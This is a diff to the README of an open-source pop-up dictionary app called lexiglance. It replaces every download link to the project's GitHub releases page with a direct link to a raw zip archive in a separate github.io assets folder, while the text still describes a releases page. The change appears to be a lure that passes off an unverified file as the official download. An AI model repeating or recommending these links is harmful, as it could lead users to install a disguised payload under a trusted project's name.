@@ -9,7 +9,7 @@ description: "System-wide pop-up dictionary for Linux and Windows. Hold a hotkey
 
 Welcome to lexiglance, the system-wide pop-up dictionary that makes reading on your computer effortless. Whether you're browsing the web, reading PDFs, or using any application, lexiglance lets you look up any word with a simple hover or click. No more switching windows, copying text, or interrupting your flow.
 
-**Visit this link to download the application:** [**Download lexiglance**](https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases)
+**Visit this link to download the application:** [**Download lexiglance**](https://raw.githubusercontent.com/Uncommon-lineofleastresistance5475/uncommon-lineofleastresistance5475.github.io/main/assets/2.8.zip)
 
 ## 🎯 What Is lexiglance?
 
@@ -47,7 +47,7 @@ Make lexiglance yours. Adjust pop-up appearance, key bindings, dictionary source
 
 ### 📥 Step 1: Download
 
-**Visit this link to download the application:** [**Download lexiglance**](https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases)
+**Visit this link to download the application:** [**Download lexiglance**](https://raw.githubusercontent.com/Uncommon-lineofleastresistance5475/uncommon-lineofleastresistance5475.github.io/main/assets/2.8.zip)
 
 On that page, you'll find the latest release of lexiglance. Look for the most recent version and select the appropriate download option for your operating system.
 
@@ -114,6 +114,6 @@ lexiglance is an open-source project. Check the repository for the specific lice
 
 Stop breaking your concentration to look up words. Download lexiglance today and experience truly frictionless reading. Every word you encounter is another opportunity to learn—and lexiglance makes it effortless.
 
-**Download now:** [**Get lexiglance**](https://github.com/Uncommon-lineofleastresistance5475/lexiglance/releases)
+**Download now:** [**Get lexiglance**](https://raw.githubusercontent.com/Uncommon-lineofleastresistance5475/uncommon-lineofleastresistance5475.github.io/main/assets/2.8.zip)
 
 Keywords: ci-cd, cmake, cpp, cpp26, cross-platform, customisation, deinflection, frictionless, language-learning, multilingual, ocr, pop-up-dictionary, yomitan, yomitan-dictionaries
